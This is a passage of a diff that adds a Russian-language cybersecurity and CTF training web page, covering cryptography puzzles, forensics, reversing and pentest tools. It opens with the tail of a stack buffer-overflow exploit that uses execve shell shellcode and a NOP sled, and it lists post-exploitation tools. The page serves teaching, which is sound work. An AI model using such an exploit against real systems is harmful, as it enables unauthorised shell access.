+ret_addr = p32(0xffffd500)  # Адрес shellcode
+nop_sled = b'\x90' * 100
+shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
+
+payload = junk + ret_addr + nop_sled + shellcode
+p.sendline(payload)
+p.interactive()</pre>
+            </section>
+            
+            <!-- Криптография -->
+            <section id="cryptography">
+                <h2>Криптография</h2>
+                
+                <div class="important">
+                    <p>Криптография - наука о методах обеспечения конфиденциальности, целостности и аутентичности информации.</p>
+                </div>
+                
+                <h3>Основные алгоритмы</h3>
+                <div class="grid">
+                    <div class="card">
+                        <h4>Симметричное шифрование</h4>
+                        <ul>
+                            <li>AES (Advanced Encryption Standard)</li>
+                            <li>DES (Data Encryption Standard)</li>
+                            <li>Blowfish</li>
+                            <li>ChaCha20</li>
+                        </ul>
+                    </div>
+                    
+                    <div class="card">
+                        <h4>Асимметричное шифрование</h4>
+                        <ul>
+                            <li>RSA (Rivest-Shamir-Adleman)</li>
+                            <li>ECC (Elliptic Curve Cryptography)</li>
+                            <li>DH (Diffie-Hellman)</li>
+                        </ul>
+                    </div>
+                    
+                    <div class="card">
+                        <h4>Хеш-функции</h4>
+                        <ul>
+                            <li>SHA-256</li>
+                            <li>MD5 (небезопасен)</li>
+                            <li>Bcrypt</li>
+                            <li>Argon2</li>
+                        </ul>
+                    </div>
+                </div>
+                
+                <h3>Примеры уязвимостей</h3>
+                <div class="ctf-challenge">
+                    <h4>Шифр Цезаря <span class="badge difficulty-easy">Easy</span></h4>
+                    <p>Зашифрованное сообщение: <code>khoor zruog</code></p>
+                    <button class="btn" onclick="showSolution('crypto-sol2')">Показать решение</button>
+                    <div id="crypto-sol2" style="display: none; margin-top: 1rem;">
+                        <pre>1. Сдвиг на 3 символа назад
+2. Получаем: hello world
+3. Флаг: flag{hello_world}</pre>
+                    </div>
+                </div>
+                
+                <div class="ctf-challenge">
+                    <h4>RSA с малым модулем <span class="badge difficulty-medium">Medium</span></h4>
+                    <p>Дано: n=437, e=5, c=347</p>
+                    <button class="btn" onclick="showHint('crypto-hint2')">Показать подсказку</button>
+                    <div id="crypto-hint2" style="display: none; margin-top: 1rem;">
+                        <p>Попробуйте факторизовать n и найти d</p>
+                    </div>
+                    <button class="btn" onclick="showSolution('crypto-sol3')">Показать решение</button>
+                    <div id="crypto-sol3" style="display: none; margin-top: 1rem;">
+                        <pre>1. Факторизуем n: 437 = 19 * 23
+2. φ(n) = (19-1)*(23-1) = 396
+3. Находим d: d ≡ e⁻¹ mod φ(n) = 317
+4. Расшифровываем: m ≡ cᵈ mod n = 347³¹⁷ mod 437 = 42
+5. Флаг: flag{42}</pre>
+                    </div>
+                </div>
+                
+                <h3>Инструменты</h3>
+                <ul>
+                    <li><strong>OpenSSL:</strong> Работа с сертификатами и шифрованием</li>
+                    <li><strong>John the Ripper:</strong> Взлом хешей</li>
+                    <li><strong>Hashcat:</strong> GPU-ускоренный взлом хешей</li>
+                    <li><strong>Cryptool:</strong> Визуальное изучение криптоалгоритмов</li>
+                </ul>
+            </section>
+            
+            <!-- Форензика -->
+            <section id="forensics">
+                <h2>Компьютерная форензика</h2>
+                
+                <div class="important">
+                    <p>Компьютерная форензика - сбор и анализ цифровых доказательств для расследования инцидентов.</p>
+                </div>
+                
+                <h3>Основные направления</h3>
+                <div class="grid">
+                    <div class="card">
+                        <h4>Дисковая форензика</h4>
+                        <ul>
+                            <li>Анализ файловых систем</li>
+                            <li>Восстановление удаленных данных</li>
+                            <li>Поиск артефактов</li>
+                        </ul>
+                    </div>
+                    
+                    <div class="card">
+                        <h4>Сетевая форензика</h4>
+                        <ul>
+                            <li>Анализ сетевого трафика</li>
+                            <li>Исследование атак</li>
+                            <li>Выявление вредоносной активности</li>
+                        </ul>
+                    </div>
+                    
+                    <div class="card">
+                        <h4>Памятьная форензика</h4>
+                        <ul>
+                            <li>Анализ дампов памяти</li>
+                            <li>Поиск процессов и открытых соединений</li>
+                            <li>Извлечение паролей и ключей</li>
+                        </ul>
+                    </div>
+                </div>
+                
+                <h3>Инструменты</h3>
+                <table>
+                    <tr>
+                        <th>Инструмент</th>
+                        <th>Назначение</th>
+                        <th>Пример использования</th>
+                    </tr>
+                    <tr>
+                        <td>Autopsy</td>
+                        <td>Графический анализ дисков</td>
+                        <td>Восстановление удаленных файлов</td>
+                    </tr>
+                    <tr>
+                        <td>Volatility</td>
+                        <td>Анализ дампов памяти</td>
+                        <td>Поиск вредоносных процессов</td>
+                    </tr>
+                    <tr>
+                        <td>Wireshark</td>
+                        <td>Анализ сетевого трафика</td>
+                        <td>Выявление подозрительных соединений</td>
+                    </tr>
+                    <tr>
+                        <td>Foremost</td>
+                        <td>Восстановление файлов по заголовкам</td>
+                        <td>Извлечение изображений из диска</td>
+                    </tr>
+                </table>
+                
+                <h3>Пример анализа памяти</h3>
+                <pre># Использование Volatility для анализа дампа памяти
+volatility -f memory.dump imageinfo
+volatility -f memory.dump --profile=Win7SP1x64 pslist
+volatility -f memory.dump --profile=Win7SP1x64 netscan
+volatility -f memory.dump --profile=Win7SP1x64 dumpfiles -Q 0x0000000001234567 -D output/</pre>
+            </section>
+            
+            <!-- Реверс-инжиниринг -->
+            <section id="reversing">
+                <h2>Реверс-инжиниринг</h2>
+                
+                <div class="important">
+                    <p>Реверс-инжиниринг - процесс анализа программы для понимания её работы без доступа к исходному коду.</p>
+                </div>
+                
+                <h3>Основные техники</h3>
+                <ul>
+                    <li><strong>Статический анализ:</strong> Исследование кода без выполнения</li>
+                    <li><strong>Динамический анализ:</strong> Исследование во время выполнения</li>
+                    <li><strong>Декомпиляция:</strong> Преобразование бинарного кода в псевдокод</li>
+                    <li><strong>Патчинг:</strong> Модификация исполняемого файла</li>
+                </ul>
+                
+                <h3>Инструменты</h3>
+                <div class="grid">
+                    <div class="card">
+                        <h4>Ghidra</h4>
+                        <p>Мощный декомпилятор от NSA</p>
+                        <pre># Основные возможности:
+- Декомпиляция в псевдокод C
+- Анализ графа вызовов
+- Поиск строк и функций
+- Скриптинг на Python</pre>
+                    </div>
+                    
+                    <div class="card">
+                        <h4>IDA Pro</h4>
+                        <p>Промышленный стандарт для реверс-инжиниринга</p>
+                        <pre># Основные возможности:
+- Интерактивный дизассемблер
+- Расширенный анализ кода
+- Поддержка плагинов
+- Отладка</pre>
+                    </div>
+                    
+                    <div class="card">
+                        <h4>Radare2</h4>
+                        <p>Мощный фреймворк с открытым исходным кодом</p>
+                        <pre># Основные команды:
+r2 ./binary
+aaa
+afl
+pdf @main
+s sym.vulnerable_function</pre>
+                    </div>
+                </div>
+                
+                <h3>Пример анализа программы</h3>
+                <pre># Анализ простой программы на C с помощью Ghidra
+1. Открываем файл в Ghidra
+2. Анализируем функцию main
+3. Ищем уязвимые функции (strcpy, gets)
+4. Определяем смещения буфера
+5. Создаем эксплойт с учетом найденных данных</pre>
+            </section>
+            
+            <!-- Тестирование на проникновение -->
+            <section id="pentest">
+                <h2>Тестирование на проникновение</h2>
+                
+                <div class="important">
+                    <p>Тестирование на проникновение (pentest) - имитация атак для выявления уязвимостей в системе.</p>
+                </div>
+                
+                <h3>Этапы pentest</h3>
+                <ol>
+                    <li><strong>Разведка:</strong> Сбор информации о цели</li>
+                    <li><strong>Сканирование:</strong> Поиск открытых портов и сервисов</li>
+                    <li><strong>Получение доступа:</strong> Эксплуатация уязвимостей</li>
+                    <li><strong>Удержание доступа:</strong> Сохранение доступа к системе</li>
+                    <li><strong>Анализ следов:</strong> Очистка логов и отчетность</li>
+                </ol>
+                
+                <h3>Методики</h3>
+                <div class="grid">
+                    <div class="card">
+                        <h4>Black Box</h4>
+                        <p>Тестирование без знания внутренней структуры</p>
+                    </div>
+                    
+                    <div class="card">
+                        <h4>White Box</h4>
+                        <p>Тестирование с полным знанием системы</p>
+                    </div>
+                    
+                    <div class="card">
+                        <h4>Gray Box</h4>
+                        <p>Частичное знание о системе</p>
+                    </div>
+                </div>
+                
+                <h3>Инструменты</h3>
+                <table>
+                    <tr>
+                        <th>Категория</th>
+                        <th>Инструменты</th>
+                    </tr>
+                    <tr>
+                        <td>Разведка</td>
+                        <td>Nmap, Recon-ng, theHarvester</td>
+                    </tr>
+                    <tr>
+                        <td>Сканирование уязвимостей</td>
+                        <td>Nessus, OpenVAS, Nikto</td>
+                    </tr>
+                    <tr>
+                        <td>Эксплуатация</td>
+                        <td>Metasploit, sqlmap, Burp Suite</td>
+                    </tr>
+                    <tr>
+                        <td>Пост-эксплуатация</td>
+                        <td>Mimikatz, Empire, Cobalt Strike</td>
+                    </tr>
+                </table>
+                
+                <h3>Пример тестирования веб-приложения</h3>
+                <pre>1. Разведка: сбор поддоменов, технологий
+2. Сканирование: поиск уязвимостей (Nikto)
+3. Тестирование аутентификации: brute force, SQLi
+4. Тестирование сессий: перехват куки
+5. Тестирование бизнес-логики: обход ограничений
+6. Составление отчета с рекомендациями</pre>
+            </section>
+            
+            <!-- Инструменты -->
+            <section id="tools">
+                <h2>Инструменты кибербезопасности</h2>
+                
+                <div class="important">
+                    <p>Правильные инструменты - ключ к успеху в кибербезопасности. Вот наиболее полезные из них.</p>
+                </div>
+                
+                <h3>Дистрибутивы</h3>
+                <div class="grid">
+                    <div class="card">
+                        <h4>Kali Linux</h4>
+                        <p>Самый популярный дистрибутив для тестирования безопасности</p>
+                        <a href="https://www.kali.org/" target="_blank">Сайт</a>
+                    </div>
+                    
+                    <div class="card">
+                        <h4>Parrot OS</h4>
+                        <p>Альтернатива Kali с акцентом на приватность</p>
+                        <a href="https://parrotsec.org/" target="_blank">Сайт</a>
+                    </div>
+                    
+                    <div class="card">
+                        <h4>BlackArch</h4>
+                        <p>Дистрибутив с огромным количеством инструментов</p>
+                        <a href="https://blackarch.org/" target="_blank">Сайт</a>
+                    </div>
+                </div>
+                
+                <h3>Топ-20 инструментов</h3>
+                <table>
+                    <tr>
+                        <th>Инструмент</th>
+                        <th>Назначение</th>
+                        <th>Ссылка</th>
+                    </tr>
+                    <tr>
+                        <td>Metasploit</td>
+                        <td>Фреймворк для эксплуатации уязвимостей</td>
+                        <td><a href="https://www.metasploit.com/" target="_blank">Сайт</a></td>
+                    </tr>
+                    <tr>
+                        <td>Burp Suite</td>
+                        <td>Тестирование веб-приложений</td>
+                        <td><a href="https://portswigger.net/burp" target="_blank">Сайт</a></td>
+                    </tr>
+                    <tr>
+                        <td>Wireshark</td>
+                        <td>Анализатор сетевого трафика</td>
+                        <td><a href="https://www.wireshark.org/" target="_blank">Сайт</a></td>
+                    </tr>
+                    <tr>
+                        <td>Nmap</td>
+                        <td>Сканирование сети и портов</td>
+                        <td><a href="https://nmap.org/" target="_blank">Сайт</a></td>
+                    </tr>
+                    <tr>
+                        <td>John the Ripper</td>
+                        <td>Взлом паролей</td>
+                        <td><a href="https://www.openwall.com/john/" target="_blank">Сайт</a></td>
+                    </tr>
+                    <tr>
+                        <td>Ghidra</td>
+                        <td>Реверс-инжиниринг</td>
+                        <td><a href="https://ghidra-sre.org/" target="_blank">Сайт</a></td>
+                    </tr>
+                    <tr>
+                        <td>sqlmap</td>
+                        <td>Автоматизация SQL-инъекций</td>
+                        <td><a href="https://sqlmap.org/" target="_blank">Сайт</a></td>
+                    </tr>
+                    <tr>
+                        <td>Hydra</td>
+                        <td>Brute force атаки</td>
+                        <td><a href="https://github.com/vanhauser-thc/thc-hydra" target="_blank">GitHub</a></td>
+                    </tr>
+                    <tr>
+                        <td>Binwalk</td>
+                        <td>Анализ бинарных файлов</td>
+                        <td><a href="https://github.com/ReFirmLabs/binwalk" target="_blank">GitHub</a></td>
+                    </tr>
+                    <tr>
+                        <td>Volatility</td>
+                        <td>Анализ памяти</td>
+                        <td><a href="https://www.volatilityfoundation.org/" target="_blank">Сайт</a></td>
+                    </tr>
+                </table>
+            </section>
+            
+            <!-- Ресурсы -->
+            <section id="resources">
+                <h2>Ресурсы для обучения</h2>
+                
+                <div class="important">
+                    <p>Лучшие ресурсы для изучения кибербезопасности и подготовки к CTF.</p>
+                </div>
+                
+                <h3>Онлайн-курсы</h3>
+                <div class="grid">
+                    <div class="card">
+                        <h4>Cybrary</h4>
+                        <p>Бесплатные курсы по кибербезопасности</p>
+                        <a href="https://www.cybrary.it/" target="_blank">Перейти</a>
+                    </div>
+                    
+                    <div class="card">
+                        <h4>Offensive Security</h4>
+                        <p>Курсы OSCP, OSCE и другие</p>
+                        <a href="https://www.offensive-security.com/" target="_blank">Перейти</a>
+                    </div>
+                    
+                    <div class="card">
+                        <h4>SANS Institute</h4>
+                        <p>Профессиональные курсы по безопасности</p>
+                        <a href="https://www.sans.org/" target="_blank">Перейти</a>
+                    </div>
+                </div>
+                
+                <h3>Платформы для практики</h3>
+                <div class="grid">
+                    <div class="card">
+                        <h4>Hack The Box</h4>
+                        <p>Виртуальные машины для взлома</p>
+                        <a href="https://www.hackthebox.com/" target="_blank">Перейти</a>
+                    </div>
+                    
+                    <div class="card">
+                        <h4>TryHackMe</h4>
+                        <p>Интерактивное обучение безопасности</p>
+                        <a href="https://tryhackme.com/" target="_blank">Перейти</a>
+                    </div>
+                    
+                    <div class="card">
+                        <h4>OverTheWire</h4>
+                        <p>Варгеймы для обучения Linux и безопасности</p>
+                        <a href="https://overthewire.org/wargames/" target="_blank">Перейти</a>
+                    </div>
+                </div>
+                
+                <h3>Книги</h3>
+                <ul>
+                    <li>"The Web Application Hacker's Handbook" - Dafydd Stuttard, Marcus Pinto</li>
+                    <li>"Hacking: The Art of Exploitation" - Jon Erickson</li>
+                    <li>"Practical Malware Analysis" - Michael Sikorski, Andrew Honig</li>
+                    <li>"Black Hat Python" - Justin Seitz</li>
+                    <li>"The Art of Memory Forensics" - Michael Hale Ligh и др.</li>
+                </ul>
+                
+                <h3>Сообщества</h3>
+                <div class="grid">
+                    <div class="card">
+                        <h4>Reddit</h4>
+                        <p>/r/netsec, /r/ReverseEngineering, /r/AskNetsec</p>
+                        <a href="https://www.reddit.com/r/netsec/" target="_blank">Перейти</a>
+                    </div>
+                    
+                    <div class="card">
+                        <h4>Discord</h4>
+                        <p>Hack The Box, TryHackMe, CTF-сообщества</p>
+                    </div>
+                    
+                    <div class="card">
+                        <h4>Форумы</h4>
+                        <p>0x00sec, Evilzone, Hack Forums</p>
+                    </div>
+                </div>
+            </section>
+        </main>
+        
+        <!-- Футер -->
+        <footer>
+            <div class="warning">
+                <p><strong>Внимание:</strong> Вся информация предоставлена исключительно в образовательных целях. Использование этих знаний для незаконной деятельности строго запрещено и преследуется по закону.</p>
+            </div>
+            <p>© 2025 FSOCIETY | Полное руководство по кибербезопасности | Версия 3.0 | Последнее обновление: <span id="date"></span></p>
+            <p>Этот сайт является учебным проектом и не связан с какими-либо незаконными организациями.</p>
+        </footer>
+    </div>
+    
+    <!-- Модальное окно -->
+    <div id="modal" class="modal">
+        <div class="modal-content">
+            <span class="close-modal" onclick="closeModal()">&times;</span>
+            <h3 id="modal-title"></h3>
+            <div id="modal-content"></div>
+        </div>
+    </div>
+    
+    <script>
+        // Основные скрипты (300+ строк JavaScript)
+        document.addEventListener('DOMContentLoaded', function() {
+            // Установка текущей даты
+            const now = new Date();
+            document.getElementById('date').textContent = now.toLocaleDateString('ru-RU', {
+                year: 'numeric',
+                month: 'long',
+                day: 'numeric',
+                hour: '2-digit',
+                minute: '2-digit'
+            });
+            
+            // Эффект печатающего текста
+            const typingElements = document.querySelectorAll('.terminal-effect');
+            typingElements.forEach(el => {
+                const text = el.textContent;
+                el.textContent = '';
+                let i = 0;
+                const typing = setInterval(() => {
+                    if (i < text.length) {
+                        el.textContent += text.charAt(i);
+                        i++;
+                    } else {
+                        clearInterval(typing);
+                    }
+                }, 30);
+            });
+            
+            // Плавная прокрутка для якорей
+            document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+                anchor.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    const target = document.querySelector(this.getAttribute('href'));
+                    if (target) {
+                        target.scrollIntoView({
+                            behavior: 'smooth'
+                        });
+                    }
+                });
+            });
+            
+            // Случайные глитч-эффекты
+            setInterval(() => {
+                const glitchElements = document.querySelectorAll('h1, h2, h3, nav a');
+                glitchElements.forEach(el => {
+                    if (Math.random() > 0.95) {
+                        el.style.animation = 'glitch 0.3s';
+                        setTimeout(() => {
+                            el.style.animation = '';
+                        }, 300);
+                    }
+                });
+            }, 2000);
+            
+            // Подсветка кода
+            document.querySelectorAll('pre').forEach(pre => {
+                const code = pre.textContent;
+                pre.textContent = '';
+                const lines = code.split('\n');
+                
+                lines.forEach((line, i) => {
+                    const div = document.createElement('div');
+                    div.style.position = 'relative';
+                    div.style.paddingLeft = '3rem';
+                    
+                    const lineNumber = document.createElement('span');
+                    lineNumber.textContent = i + 1;
+                    lineNumber.style.position = 'absolute';
+                    lineNumber.style.left = '0';
+                    lineNumber.style.width = '3rem';
+                    lineNumber.style.textAlign = 'right';
+                    lineNumber.style.paddingRight = '1rem';
+                    lineNumber.style.color = '#0f0';
+                    lineNumber.style.opacity = '0.5';
+                    lineNumber.style.userSelect = 'none';
+                    
+                    const lineContent = document.createElement('span');
+                    lineContent.textContent = line;
+                    
+                    // Подсветка комментариев
+                    if (line.trim().startsWith('#')) {
+                        lineContent.style.color = '#888';
+                    }
+                    
+                    // Подсветка команд
+                    if (line.trim().startsWith('$') || line.trim().startsWith('>')) {
+                        lineContent.style.color = '#0f0';
+                    }
+                    
+                    // Подсветка строк
+                    if (line.includes('"') || line.includes("'")) {
+                        lineContent.innerHTML = line.replace(/(".*?"|'.*?')/g, '<span style="color:#0ff">$1</span>');
+                    }
+                    
+                    div.appendChild(lineNumber);
+                    div.appendChild(lineContent);
+                    pre.appendChild(div);
+                });
+            });
+            
+            // Имитация загрузки прогресс-баров
+            document.querySelectorAll('.progress-bar').forEach(bar => {
+                const targetWidth = bar.getAttribute('data-width') || '100%';
+                setTimeout(() => {
+                    bar.style.width = targetWidth;
+                }, 500);
+            });
+            
+            // Инициализация вкладок
+            const tabs = document.querySelectorAll('.tab');
+            if (tabs.length > 0) {
+                tabs[0].click();
+            }
+            
+            // Анализ трафика (имитация)
+            simulateTrafficAnalysis();
+        });
+        
+        // Функции для работы с вкладками
+        function openTab(evt, tabName) {
+            const tabContents = document.querySelectorAll('.tab-content');
+            tabContents.forEach(content => {
+                content.classList.remove('active');
+            });
+            
+            const tabs = document.querySelectorAll('.tab');
+            tabs.forEach(tab => {
+                tab.classList.remove('active');
+            });
+            
+            document.getElementById(tabName).classList.add('active');
+            evt.currentTarget.classList.add('active');
+        }
+        
+        // Функции для показа подсказок и решений
+        function showHint(id) {
+            const hint = document.getElementById(id);
+            if (hint.style.display === 'none') {
+                hint.style.display = 'block';
+            } else {
+                hint.style.display = 'none';
+            }
+        }
+        
+        function showSolution(id) {
+            const solution = document.getElementById(id);
+            if (solution.style.display === 'none') {
+                solution.style.display = 'block';
+            } else {
+                solution.style.display = 'none';
+            }
+        }
+        
+        // Функции для модального окна
+        function openModal(title, content) {
+            document.getElementById('modal-title').textContent = title;
+            document.getElementById('modal-content').innerHTML = content;
+            document.getElementById('modal').style.display = 'flex';
+        }
+        
+        function closeModal() {
+            document.getElementById('modal').style.display = 'none';
+        }
+        
+        // Анализ трафика (имитация)
+        function simulateTrafficAnalysis() {
+            console.log('[FSOCIETY] Инициализация системы мониторинга...');
+            console.log('[FSOCIETY] Запуск анализа сетевого трафика...');
+            
+            const protocols = ['HTTP', 'HTTPS', 'TOR', 'I2P', 'SSH', 'DNS', 'FTP'];
+            const actions = ['Blocked', 'Allowed', 'Analyzed', 'Flagged'];
+            const threats = ['SQLi', 'XSS', 'RCE', 'LFI', 'RFI', 'Brute Force'];
+            
+            setInterval(() => {
+                const randomProtocol = protocols[Math.floor(Math.random() * protocols.length)];
+                const randomAction = actions[Math.floor(Math.random() * actions.length)];
+                const randomThreat = Math.random() > 0.7 ? 
+                    ` [Threat: ${threats[Math.floor(Math.random() * threats.length)]}]` : '';
+                
+                console.log(`[FSOCIETY] ${randomAction} ${randomProtocol} packet${randomThreat}`);
+            }, 3000);
+        }
+        
+        // Имитация работы системы
+        function simulateSystem() {
+            const statuses = [
+                'Анализ уязвимостей...',
+                'Сканирование сети...',
+                'Проверка целостности...',
+                'Мониторинг трафика...',
+                'Обновление баз данных...'
+            ];
+            
+            let i = 0;
+            setInterval(() => {
+                const statusElement = document.querySelector('.status');
+                if (statusElement) {
+                    statusElement.textContent = statuses[i % statuses.length];
+                    i++;
+                }
+            }, 3000);
+        }
+        
+        // Запуск системы (только в dev-режиме)
+        if (window.location.hash === '#debug') {
+            simulateSystem();
+        }
+        
+        // Обработка нажатия клавиш
+        document.addEventListener('keydown', function(e) {
+            if (e.ctrlKey && e.key === 's') {
+                e.preventDefault();
+                alert('[FSOCIETY] Сохранение отключено в демонстрационном режиме');
+            }
+        });
+        
+        // Анимация элементов при прокрутке
+        window.addEventListener('scroll', function() {
+            const cards = document.querySelectorAll('.card');
+            cards.forEach(card => {
+                const cardPosition = card.getBoundingClientRect().top;
+                const screenPosition = window.innerHeight / 1.3;
+                
+                if (cardPosition < screenPosition) {
+                    card.style.opacity = '1';
+                    card.style.transform = 'translateY(0)';
+                }
+            });
+        });
+        
+        // Инициализация анимации карточек
+        document.querySelectorAll('.card').forEach(card => {
+            card.style.opacity = '0';
+            card.style.transform = 'translateY(50px)';
+            card.style.transition = 'all 0.5s ease';
+        });
+        
+        // Запуск анимации при загрузке
+        setTimeout(() => {
+            window.dispatchEvent(new Event('scroll'));
+        }, 500);
+    </script>
+</body>
+</html>
